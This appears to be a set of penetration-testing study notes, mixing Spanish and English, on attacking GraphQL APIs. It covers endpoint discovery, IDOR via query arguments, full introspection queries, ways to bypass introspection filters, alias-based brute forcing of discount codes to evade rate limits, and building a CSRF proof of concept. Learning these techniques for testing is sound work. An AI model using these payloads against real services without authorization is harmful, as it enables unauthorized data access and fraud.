# GraphQL API vulns

## Encontrar un endpoint de GraphQL


----------------------------------------
Si envías `query{__typename}` en el body de una petición a un endpoint de GraphQL, en algún lugar de la respuesta aparecerá `{"data": {"__typename": "query"}}` , esto es conocido cmom universal query y lo usaremos para ver si el endpoint usa GraphQL 

Esto funciona porque todos los endpoints de GraphQL tienen un campo reservado llamado `__typename` que retorna el tipo del objeto pedido mediante strings

Algunos endpoints clásicos son  :

- `/graphql`
- `/api`
- `/api/graphql`
- `/graphql/api`
- `/graphql/graphql`

Si estos paths no devuelven la query hay que probar añadiéndoles `/v1` al principio del path


------------------------------------------

Una vez tenemos el endpoint tenemos que ver que métodos deja usar.
En un caso ideal solo nos debería dejar peticiones POST con content type `application/json`, pero puede ser que acepte peticiones GET y POST con content type `x-www-form-urlencoded` 

## Exploiting unsanitized arguments

Testear query arguments es un buen punto de partida, si la API usa argumentos para acceder directamente a objetos podríamos estar ante un IDOR

Request normal:

```
#Example product query 

query { 
	products { 
		id 
		name 
		listed 
	} 
}
```

Respeusta normal:

```
#Example product response 

{ 
	"data": { 
		"products": [ 
			{ 
				"id": 1, 
				"name": "Product 1", 
				"listed": true 
			}, 
			{ 
				"id": 2, 
				"name": "Product 2", 
				"listed": true 
			}, 
			{ 
				"id": 4, 
				"name": "Product 4", 
				"listed": true 
			} 
		] 
	} 
}
```

Peticion con IDOR

```
#Query to get missing product 

query { 
	product(id: 3) { 
		id 
		name 
		listed 
	} 
}
```

Respuesta al IDOR

```
#Missing product response 

{ 
	"data": { 
		"product": { 
			"id": 3, 
			"name": "Product 3", 
			"listed": no 
		} 
	} 
}
```

## Discovering schema information

The best way to do this is to use introspection queries. Introspection is a built-in GraphQL function that enables you to query a server for information about the schema.

Para ello tendremos que hacer una query al campo  `__schema` 

Ejemplo:

```

#Introspection probe request 

	{ 
		"query": "{__schema{queryType{name}}}" 
	}
```

**Full introspection query** 

```
#Full introspection query 

query IntrospectionQuery { 
	__schema { 
		queryType { 
			name 
		} 
		mutationType { 
			name 
		} 
		subscriptionType { 
			name 
		} types { 
			...FullType 
		} 
		directives { 
			name 
			description 
			args { 
				...InputValue 
		} 
		onOperation #Often needs to be deleted to run query 
		onFragment #Often needs to be deleted to run query 
		onField #Often needs to be deleted to run query 
		} 
	} 
} 

fragment FullType on __Type { 
	kind 
	name 
	description 
	fields(includeDeprecated: true) { 
		name 
		description 
		args { 
			...InputValue 
		} type { 
			...TypeRef 
		} 
		isDeprecated 
		deprecationReason 
	} inputFields { 
		...InputValue 
	} interfaces { 
		...TypeRef } 
	enumValues(includeDeprecated: true) { 
		name 
		description 
		isDeprecated 
		deprecationReason 
	} 
	possibleTypes { 
		...TypeRef 
	} 
} 

fragment InputValue on __InputValue { 
	name 
	description 
	type { 
		...TypeRef 
	} 
	defaultValue 
} 

fragment TypeRef on __Type { 
	kind 
	name 
	ofType { 
		kind 
		name 
		ofType { 
			kind 
			name 
			ofType { 
				kind 
				name 
			} 
		} 
	} 
}
```

If introspection is enabled but the above query doesn't run, try removing the `onOperation`, `onFragment`, and `onField` directives from the query structure. Many endpoints do not accept these directives as part of an introspection query, and you can often have more success with introspection by removing them.

Para entender los resultado mete la respeusta en GraphQL visualizer, es una herramienta online

Even if introspection is entirely disabled, you can sometimes use suggestions to glean information on an API's structure.

Suggestions are a feature of the Apollo GraphQL platform in which the server can suggest query amendments in error messages. These are generally used where a query is slightly incorrect but still recognizable (for example, `There is no entry for 'productInfo'. Did you mean 'productInformation' instead?`).

You can potentially glean useful information from this, as the response is effectively giving away valid parts of the schema.

Clairvoyance is a tool that uses suggestions to automatically recover all or part of a GraphQL schema, even when introspection is disabled. This makes it significantly less time consuming to piece together information from suggestion responses.

## Bypassing GraphQL introspection defenses

1. Poner un carácter especial al final de `__schema`(espacios, comas, saltos de línea)
2. Si el developer solo excluye `__schema{` 

```
#Introspection query with newline 
{ 
	"query": "query{__schema 
		{queryType{name}}}" 
}
```

3. Hacer todo lo anterior con POST y GET que tengan `x-www-form-urlencoded` como content-type
 
```
GET /graphql?query=query%7B__schema%0A%7BqueryType%7Bname%7D%7D%7D
```

## Bypassing rate limiting using aliases


Los objetos en GraphQL no pueden contener varias propiedades con el mismo nombre . Aliases enable you to bypass this restriction by explicitly naming the properties you want the API to return. You can use aliases to return multiple instances of the same type of object in one request.

Este ejemplo muestra como con peticiones anidadas podemos probar varios campos sin necesidad de hacer bruteforcer que pueda provocar un rate limit

```

#Request with aliased queries 

query isValidDiscount($code: Int) { 
	isvalidDiscount(code:$code){ 
		valid 
	} 
	isValidDiscount2:isValidDiscount(code:$code){ 
		valid 
	} 
	isValidDiscount3:isValidDiscount(code:$code){ 
		valid 
	} 
}
```

Ejemplo en burp

<img width="598" height="583" alt="image" src="https://github.com/user-attachments/assets/bcf8c40d-9a51-4259-8a08-416280302dbc" />

## GraphQL CSRF

El CSRF viene dado cuando no hay token CSRF y el servidor acepta peticiones con content.type `x-www-form-urlencoded` 

Ejemplo:


1. Cambiar el content-type
2. Copiar el query

<img width="567" height="568" alt="image" src="https://github.com/user-attachments/assets/0f4a11d4-1189-4ebf-9691-7b41db1fd4d5" />

3. Crear un campo "query" donde se mete todo el query de GraphQL encodeado en URL y otro campo  "variables"  con la parte de las variables de GraphQL

<img width="695" height="449" alt="image" src="https://github.com/user-attachments/assets/d82bb23b-85d8-4306-b016-bb8145f996e9" />

5. Generar el CSRF PoC y listo

